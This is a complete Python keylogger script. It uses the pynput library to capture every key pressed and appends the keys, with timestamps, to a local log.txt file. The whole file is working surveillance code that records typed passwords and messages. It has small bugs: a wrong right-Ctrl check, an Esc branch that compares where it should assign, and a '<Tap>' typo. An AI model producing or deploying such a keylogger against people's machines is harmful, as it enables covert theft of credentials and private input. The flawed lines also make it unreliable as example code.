# pip install pynput
from pynput.keyboard import Listener
import time

# Use time library to print the date and time
file_ = open("log.txt",'a')
local_time = time.ctime(time.time())
file_.write("\n\n"+str(local_time))
file_.write("\n")
file_.write("--"*10+"\n")
file_.close()

# storing the keystroke in a text file
# Use of the  'with' keyword - release memory/resoutces automatically
def writeToFile(key):
    letter = str(key)
    letter = letter.replace("'","")
    
    if letter == "Key.space":
        letter = " "
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.shift_r" or letter == "Key.shift" or letter == "Key.shift_l":
        letter = ""
    if letter == "Key.alt_l" or letter == "Key.alt_r":
        letter = " <Alt> "
    if letter == "Key.ctrl_l" or letter == "ctrl_r":
        letter = " <Ctrl> "
    if letter == "Key.tab":
        letter = " <Tap> "
    if letter == "Key.print_screen":
        letter = " \n{0} --- <Print_Screen> \n".format(time.ctime(time.time()))
    if letter == "Key.delete":
        letter = " <Delete> "
    if letter == "Key.esc":
        letter == " <Esc> "
        
    print(letter)
    # write the data into the file in same .py file folder
    with open("log.txt",'a') as f:
        f.write(letter)

# Listeners - listen to keystrokes
with Listener(on_press = writeToFile) as l:
    l.join()
